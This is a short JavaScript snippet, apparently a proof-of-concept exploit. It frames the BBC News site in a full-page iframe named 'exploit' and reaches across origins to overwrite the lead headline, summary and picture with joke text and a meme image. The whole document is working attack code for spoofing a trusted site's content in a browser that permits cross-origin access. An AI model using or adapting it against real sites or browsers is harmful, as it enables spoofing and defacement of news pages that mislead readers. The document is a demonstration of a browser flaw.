var url="http://www.bbc.co.uk/news";
document.body.innerHTML='<iframe id="exploit" src="' + url + '" width="100%" height="100%" style="border:0px"/>';
setTimeout( function() {
  var doc = frames['exploit'].contentWindow.document;
  doc.getElementsByClassName('title-link__title-text')[0].innerHTML='HAI';
  doc.getElementsByClassName('buzzard__summary')[0].innerHTML = "Is it me you're looking for?"
  doc.getElementsByClassName('buzzard__image')[0].getElementsByTagName('img')[0].src='https://media.makeameme.org/created/Hello-Is-it.jpg'
 }, 600)
